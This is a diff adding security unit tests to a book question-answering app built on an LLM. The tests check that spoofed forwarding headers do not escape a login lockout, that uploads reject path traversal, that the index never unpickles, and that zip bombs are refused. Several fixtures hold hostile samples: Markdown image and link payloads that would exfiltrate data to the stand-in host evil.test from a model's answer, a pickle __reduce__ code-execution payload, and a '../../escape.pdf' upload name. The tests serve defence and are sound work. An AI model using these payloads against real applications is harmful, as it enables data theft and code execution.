@@ -912,6 +912,19 @@ class AppAccessTests(unittest.TestCase):
         self.addCleanup(stack.close)
         return AppTest.from_file(self.APP)
 
+    def test_made_up_forwarding_headers_do_not_escape_the_lockout(self):
+        # A direct connection sends a new X-Forwarded-For with every guess.
+        import itertools
+        from streamlit.runtime.context import ContextProxy
+        at = self.app("0.0.0.0", password="s3cret", ip="203.0.113.7").run(timeout=60)
+        fake = itertools.count(1)
+        with patch.object(ContextProxy, "headers", new_callable=PropertyMock,
+                          side_effect=lambda: {"x-forwarded-for": f"10.0.0.{next(fake)}"}):
+            for _ in range(5):
+                at = self.sign_in(at, "wrong")
+            at = self.sign_in(at, "s3cret")
+        self.assertTrue(any("Too many wrong passwords" in e.value for e in at.error))
+
     @staticmethod
     def gate_messages(at):
         # Past the gate the app may still report other things, e.g. an unreachable LLM.
@@ -933,7 +946,7 @@ class AppAccessTests(unittest.TestCase):
         self.assertTrue(any("proxy or tunnel" in e.value for e in at.error))
 
     def test_repeated_wrong_passwords_lock_that_client_out(self):
-        at = self.app("127.0.0.1", password="s3cret",
+        at = self.app("127.0.0.1", password="s3cret", ip="127.0.0.1",      # via the tunnel
                       headers={"cf-connecting-ip": "198.51.100.4"}).run(timeout=60)
         for _ in range(5):
             at = self.sign_in(at, "wrong")
@@ -966,6 +979,145 @@ class AppAccessTests(unittest.TestCase):
         self.assertTrue(any("Wrong password" in e.value for e in at.error))
         self.assertEqual(len(at.tabs), 0)
         self.assertFalse(at.session_state["authenticated"] if "authenticated" in at.session_state else False)
+
+
+class SecurityHardeningTests(IndexConfigMixin, unittest.TestCase):
+    EVIL = "evil.test"
+
+    def render(self, text):
+        from markdown_it import MarkdownIt
+        return MarkdownIt("commonmark", {"html": False}).render(text)
+
+    def test_client_address_trusts_forwarding_only_from_a_local_proxy(self):
+        from bookrag.websafe import client_address
+        spoof = {"x-forwarded-for": "1.2.3.4", "cf-connecting-ip": "5.6.7.8", "x-real-ip": "9.9.9.9"}
+        self.assertEqual(client_address("203.0.113.7", spoof), "203.0.113.7")
+        self.assertEqual(client_address("127.0.0.1", {"cf-connecting-ip": "198.51.100.4"}), "198.51.100.4")
+        self.assertEqual(client_address("127.0.0.1", {"x-real-ip": "198.51.100.5"}), "198.51.100.5")
+        # nginx appends the real peer; whatever the client put in front is ignored.
+        self.assertEqual(client_address("127.0.0.1", {"x-forwarded-for": "6.6.6.6, 198.51.100.6"}),
+                         "198.51.100.6")
+        self.assertEqual(client_address("::1", {}), "::1")
+
+    def test_answers_cannot_load_images_or_carry_links(self):
+        from bookrag.websafe import safe_markdown
+        u = f"https://{self.EVIL}/x.png?q=secret"
+        attacks = [
+            f"Heat is energy [1].\n\n![x]({u})",
+            f"![a [nested] b]({u})",
+            f"![a](https&#58;//{self.EVIL}/x.png)",
+            f"![a](<{u}>)",
+            f"![a](\n{u})",
+            f"[click here]({u})",
+            f"Source: <{u}>",
+            f"![logo][r]\n\n[r]: {u}",
+            f"![r]\n\n   [r]: {u}",
+            f"> [r]: {u}\n\n![a][r]",
+            f"- [r]: {u}\n\n![a][r]",
+            f"1. [r]: {u}\n\n![a][r]",
+            f"[r\nx]: {u}\n\n![a][r x]",
+            f"[a\\]b]: {u}\n\n![z][a\\]b]",
+            f"```a`b\n![x]({u})\n",                     # not a real fence opener
+            f"````\ncode\n```\n![x]({u})\n````\n",     # ``` does not close ````
+        ]
+        for text in attacks:
+            raw = self.render(text)
+            self.assertTrue("<img" in raw or "<a " in raw or text.startswith("````"), text)
+            safe = self.render(safe_markdown(text))
+            self.assertNotIn("<img", safe, text)
+            self.assertNotIn("<a ", safe, text)
+
+    def test_ordinary_answers_render_exactly_as_before(self):
+        from bookrag.websafe import safe_markdown
+        benign = [
+            "Energy is conserved [1][2]. The efficiency is $\\eta = 1 - T_c/T_h$ [3].",
+            "[1] Heat flows from hot to cold.\n\n- item one [2]\n- item two",
+            "**Carnot cycle** (see [4]): two isotherms and two adiabats.",
+            "```python\nx = a[1](2)\n[r]: https://example.com\n```\nAfter the code [5].",
+        ]
+        for text in benign:
+            self.assertEqual(self.render(safe_markdown(text)), self.render(text), text)
+        code = "```python\nx = a[1](2)\n```"
+        self.assertEqual(safe_markdown(code), code)
+
+    def test_uploads_are_validated_and_never_replace_a_different_book(self):
+        from bookrag.websafe import save_uploads
+        up = lambda name, data: SimpleNamespace(name=name, getbuffer=lambda: memoryview(data))
+        with tempfile.TemporaryDirectory() as d:
+            dest = Path(d)
+            saved, skipped = save_uploads([up("../../escape.pdf", b"one"), up(".env", b"x"),
+                                           up("run.sh", b"x"), up("notes.PDF", b"two")],
+                                          dest, {".pdf"})
+            self.assertEqual(saved, ["escape.pdf", "notes.PDF"])
+            self.assertEqual(len(skipped), 2)
+            self.assertEqual(sorted(p.name for p in dest.iterdir()), ["escape.pdf", "notes.PDF"])
+
+            saved, skipped = save_uploads([up("escape.pdf", b"one")], dest, {".pdf"})
+            self.assertEqual((saved, skipped), ([], []))              # same file again: no-op
+            saved, skipped = save_uploads([up("escape.pdf", b"other")], dest, {".pdf"})
+            self.assertEqual(saved, [])
+            self.assertIn("already exists", skipped[0])
+            self.assertEqual((dest / "escape.pdf").read_bytes(), b"one")
+
+    def test_index_never_unpickles(self):
+        import pickle
+        with tempfile.TemporaryDirectory() as d:
+            store = Store(Path(d) / "index")
+            chunks = [Chunk(f"b::{i:05d}", t, t, "b", "Book", ordinal=i)
+                      for i, t in enumerate(["entropy and heat", "carnot engine efficiency",
+                                             "second law of thermodynamics"])]
+            store.save(chunks, np.eye(3, dtype=np.float32), {"books": []})
+            gen = store._data_dir
+            self.assertFalse((gen / "bm25.pkl").exists())
+
+            marker = Path(d) / "pwned"
+
+            class Payload:
+                def __reduce__(self):
+                    return (Path.write_text, (marker, "code ran"))
+
+            (gen / "bm25.pkl").write_bytes(pickle.dumps(Payload()))
+            loaded = Store(Path(d) / "index").load()
+            hits = loaded.bm25_search("carnot efficiency", top_k=1)
+            self.assertFalse(marker.exists())
+            self.assertEqual(loaded.chunks[hits[0][0]].text, "carnot engine efficiency")
+
+    def test_zip_bombs_are_refused_before_parsing(self):
+        import zipfile
+        from bookrag.ingest import loaders
+        with tempfile.TemporaryDirectory() as d:
+            bomb = Path(d) / "book.docx"
+            with zipfile.ZipFile(bomb, "w", zipfile.ZIP_DEFLATED) as zf:
+                for i in range(10):
+                    zf.writestr(f"word/part{i}.xml", "0" * 100_000)
+            self.assertLess(bomb.stat().st_size, 5_000)
+            with self.assertRaisesRegex(ValueError, "unpacks to"):
+                loaders.check_archive(bomb, max_bytes=500_000)
+            with self.assertRaisesRegex(ValueError, "archive members"):
+                loaders.check_archive(bomb, max_members=5)
+            with patch.object(loaders, "MAX_UNZIPPED_BYTES", 500_000), \
+                    patch("docx.Document", side_effect=AssertionError("parsed a bomb")):
+                with self.assertRaisesRegex(ValueError, "unpacks to"):
+                    loaders.load_document(bomb)
+            fake = Path(d) / "book.epub"
+            fake.write_bytes(b"not a zip at all")
+            with self.assertRaisesRegex(ValueError, "not a valid"):
+                loaders.load_document(fake)
+
+    def test_one_unreadable_book_does_not_stop_the_build(self):
+        from bookrag.index.builder import build_index
+        with tempfile.TemporaryDirectory() as d, \
+                patch("bookrag.index.builder.embedder_from_config", return_value=FakeEmbedder()), \
+                patch("bookrag.index.builder.arbiter_from_config", return_value=Mock()):
+            cfg = self.cfg(d)
+            books = Path(d) / "books"
+            books.mkdir()
+            (books / "good.md").write_text("# Chapter 1\n" + "Heat is energy in transit. " * 80)
+            (books / "broken.epub").write_bytes(b"\x00garbage")
+            log = []
+            m = build_index(cfg, progress=log.append)
+            self.assertEqual([b["title"] for b in m["books"]], ["good"])
+            self.assertTrue(any("broken.epub could not be read" in line for line in log), log)
 
 
 class WeightsTests(unittest.TestCase):
@@ -1151,6 +1303,18 @@ class AppChatErrorTests(IndexConfigMixin, unittest.TestCase):
                     at.chat_input[0].set_value("What is heat?").run(timeout=60)
                 self.assertFalse(at.exception, [e.message for e in at.exception])
                 self.assertTrue(any(hint in e.value for e in at.error), [e.value for e in at.error])
+
+            # A streamed answer carrying an injected image is rendered disarmed,
+            # both live and when the chat history is redrawn.
+            evil = "Heat is energy [1].\n\n![x](https://evil.test/?q=secret)"
+            pieces = [evil[:25], evil[25:40], evil[40:]]
+            with patch("bookrag.chat.engine.ChatEngine.ask", return_value=iter(pieces)):
+                at.chat_input[0].set_value("What is heat?").run(timeout=60)
+            self.assertFalse(at.exception, [e.message for e in at.exception])
+            shown = [m.value for m in at.markdown if "Heat is energy" in m.value]
+            self.assertTrue(shown)
+            self.assertTrue(all("](" not in v for v in shown), shown)
+            self.assertIn("] (https://evil.test", shown[-1])
 
 
 if __name__ == "__main__":
